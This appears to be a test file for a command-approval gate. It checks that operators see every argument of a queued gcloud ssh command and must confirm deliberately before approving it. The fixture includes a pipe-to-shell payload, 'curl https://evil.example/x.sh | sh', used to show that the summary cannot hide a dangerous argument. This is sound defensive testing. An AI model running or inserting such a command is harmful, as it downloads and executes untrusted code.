import { describe, expect, test, afterEach, beforeEach, spyOn } from "bun:test";
import { mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createPendingQueue, type PendingRequest } from "../../gate/pending.ts";
import { describeCommand } from "../../gate/summarize-command.ts";
import { handleAdminRequest } from "../../gate/admin-handlers.ts";
import { runApprove, runPending } from "../../commands/approve.ts";
import type { Config } from "../../config.ts";
import { makeGateDeps as makeDeps } from "../gate/test-helpers.ts";

describe("approve command (admin socket)", () => {
  let server: ReturnType<typeof Bun.serve> | null = null;

  afterEach(() => {
    if (server) {
      server.stop(true);
      server = null;
    }
  });

  function setup() {
    const dir = mkdtempSync(join(tmpdir(), "approve-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    const queue = createPendingQueue({ timeoutMs: 30000, now: () => Date.now() });
    const deps = makeDeps({ pendingQueue: queue });

    server = Bun.serve({
      unix: adminSocketPath,
      fetch(req) {
        return handleAdminRequest(req, deps);
      },
    });

    return { adminSocketPath, queue };
  }

  test("approves a pending request via admin socket", async () => {
    const { adminSocketPath, queue } = setup();
    const promise = queue.enqueue("user@example.com");
    const [req] = queue.list();

    const res = await fetch(`http://localhost/pending/${req!.id}/approve`, {
      method: "POST",
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("approved");

    expect(await promise).toBe(true);
  });

  test("denies a pending request via admin socket", async () => {
    const { adminSocketPath, queue } = setup();
    const promise = queue.enqueue("user@example.com");
    const [req] = queue.list();

    const res = await fetch(`http://localhost/pending/${req!.id}/deny`, {
      method: "POST",
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("denied");

    expect(await promise).toBe(false);
  });

  test("returns 404 for unknown request ID", async () => {
    const { adminSocketPath } = setup();

    const res = await fetch(`http://localhost/pending/${"f".repeat(32)}/approve`, {
      method: "POST",
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(404);
    const body = (await res.json()) as { error: string };
    expect(body.error).toBe("Request not found or expired");
  });

  test("GET /pending lists requests with the full command over the socket", async () => {
    const { adminSocketPath, queue } = setup();
    // An argument that the 80-character summary drops entirely.
    const payload = "--command=curl https://evil.example/x.sh | sh";
    const argv = [
      "/usr/bin/gcloud",
      "compute",
      "ssh",
      "bastion-01",
      "--zone=us-central1-a",
      "--project=some-fairly-long-project-name",
      payload,
    ];
    const promise = queue.enqueue("user@example.com", describeCommand(argv));

    const res = await fetch("http://localhost/pending", {
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);

    const body = (await res.json()) as { pending: PendingRequest[] };
    expect(body.pending).toHaveLength(1);
    expect(body.pending[0]!.command?.summary).not.toContain(payload);
    expect(body.pending[0]!.command?.argv).toContain(payload);

    queue.denyAll();
    await promise;
  });

  test("GET /health returns 200 on admin socket", async () => {
    const { adminSocketPath } = setup();

    const res = await fetch("http://localhost/health", {
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("ok");
  });
});

// ---------------------------------------------------------------------------
// runApprove / runPending
//
// The property under test: approving from the CLI shows the operator the whole
// command first, and cannot happen without a deliberate confirmation.
// ---------------------------------------------------------------------------

describe("runApprove and runPending", () => {
  let server: ReturnType<typeof Bun.serve> | null = null;
  let logSpy: ReturnType<typeof spyOn>;
  let errorSpy: ReturnType<typeof spyOn>;
  let exitSpy: ReturnType<typeof spyOn>;

  const payload = "--command=curl https://evil.example/x.sh | sh";
  const argv = [
    "/usr/bin/gcloud",
    "compute",
    "ssh",
    "bastion-01",
    "--zone=us-central1-a",
    "--project=some-fairly-long-project-name",
    payload,
  ];

  beforeEach(() => {
    logSpy = spyOn(console, "log").mockImplementation(() => {});
    errorSpy = spyOn(console, "error").mockImplementation(() => {});
    exitSpy = spyOn(process, "exit").mockImplementation((() => {
      throw new Error("process.exit");
    }) as never);
  });

  afterEach(() => {
    logSpy.mockRestore();
    errorSpy.mockRestore();
    exitSpy.mockRestore();
    if (server) {
      server.stop(true);
      server = null;
    }
  });

  function setup() {
    const dir = mkdtempSync(join(tmpdir(), "approve-run-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    const queue = createPendingQueue({ timeoutMs: 30000, now: () => Date.now() });
    const deps = makeDeps({ pendingQueue: queue });

    server = Bun.serve({
      unix: adminSocketPath,
      fetch(req) {
        return handleAdminRequest(req, deps);
      },
    });

    const config = { admin_socket_path: adminSocketPath } as Config;
    return { config, queue };
  }

  /** Everything printed to stdout during the call, joined. */
  function output(): string {
    return logSpy.mock.calls.map((call: unknown[]) => String(call[0] ?? "")).join("\n");
  }

  test("runPending prints every argument of a queued command", async () => {
    const { config, queue } = setup();
    const promise = queue.enqueue("user@example.com", describeCommand(argv), "prod-breakglass");

    await runPending(config, []);

    expect(output()).toContain("user@example.com");
    expect(output()).toContain("prod-breakglass");
    for (const arg of argv.slice(1)) {
      expect(output()).toContain(arg);
    }

    queue.denyAll();
    await promise;
  });

  test("runPending reports an empty queue", async () => {
    const { config } = setup();
    await runPending(config, []);
    expect(output()).toContain("No pending requests.");
  });

  test("runPending shows a single request by ID", async () => {
    const { config, queue } = setup();
    const id = "d".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runPending(config, [id]);
    expect(output()).toContain(id);
    expect(output()).toContain(payload);

    queue.denyAll();
    await promise;
  });

  test("approve prints the full command before resolving", async () => {
    const { config, queue } = setup();
    const id = "e".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { yes: true });

    // The argument the 80-char summary drops must be on screen before the
    // "Approved" line, not after it.
    const lines = output();
    expect(lines).toContain(payload);
    expect(lines.indexOf(payload)).toBeLessThan(lines.indexOf("Approved request"));
    expect(await promise).toBe(true);
  });

  test("approve refuses to resolve without confirmation when not on a TTY", async () => {
    const { config, queue } = setup();
    const id = "f".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await expect(runApprove(config, [id], { isTTY: false })).rejects.toThrow("process.exit");
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("re-run with --yes");

    // Still pending: nothing was approved behind the operator's back.
    expect(queue.list()).toHaveLength(1);
    queue.denyAll();
    expect(await promise).toBe(false);
  });

  test("approve aborts when the operator does not type yes", async () => {
    const { config, queue } = setup();
    const id = "0".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await expect(
      runApprove(config, [id], { isTTY: true, readLine: async () => "y\n" }),
    ).rejects.toThrow("process.exit");
    expect(queue.list()).toHaveLength(1);

    queue.denyAll();
    expect(await promise).toBe(false);
  });

  test("approve proceeds when the operator types yes", async () => {
    const { config, queue } = setup();
    const id = "1".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { isTTY: true, readLine: async () => "  YES \n" });
    expect(await promise).toBe(true);
  });

  test("approve shows how long is left, not just an absolute timestamp", async () => {
    const { config, queue } = setup();
    const id = "3".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { yes: true });
    expect(output()).toMatch(/Expires:.*\(\d+s left\)/);
    expect(await promise).toBe(true);
  });

  test("approve gives up rather than resolving after the request expires", async () => {
    const { config, queue } = setup();
    const id = "4".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    // An operator who spends the whole window actually reading a long argv —
    // which is what this command asks them to do — must not have their `yes`
    // land on an already-expired request.
    await expect(
      runApprove(config, [id], { isTTY: true, readLine: async () => null }),
    ).rejects.toThrow("process.exit");
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("expired while waiting");

    queue.denyAll();
    expect(await promise).toBe(false);
  });

  test("a route-miss 404 is reported as a stale daemon, not as an expired request", async () => {
    const dir = mkdtempSync(join(tmpdir(), "approve-stale-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    // A gate that predates GET /pending/:id: every unknown route 404s with the
    // generic body.
    server = Bun.serve({
      unix: adminSocketPath,
      fetch: () => Response.json({ error: "Not found" }, { status: 404 }),
    });
    const config = { admin_socket_path: adminSocketPath } as Config;

    await expect(runApprove(config, ["5".repeat(32)], { yes: true })).rejects.toThrow(
      "process.exit",
    );
    const errors = errorSpy.mock.calls.flat().join(" ");
    expect(errors).toContain("does not serve GET /pending");
    expect(errors).not.toContain("may have expired");
  });

  test("a genuinely absent request explains the GUI-path case too", async () => {
    const { config } = setup();

    await expect(runApprove(config, ["6".repeat(32)], { yes: true })).rejects.toThrow(
      "process.exit",
    );
    const errors = errorSpy.mock.calls.flat().join(" ");
    expect(errors).toContain("no queued request");
    expect(errors).toContain("desktop dialog");
  });

  test("deny resolves without a confirmation prompt", async () => {
    const { config, queue } = setup();
    const id = "2".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { deny: true });
    expect(await promise).toBe(false);
  });
});
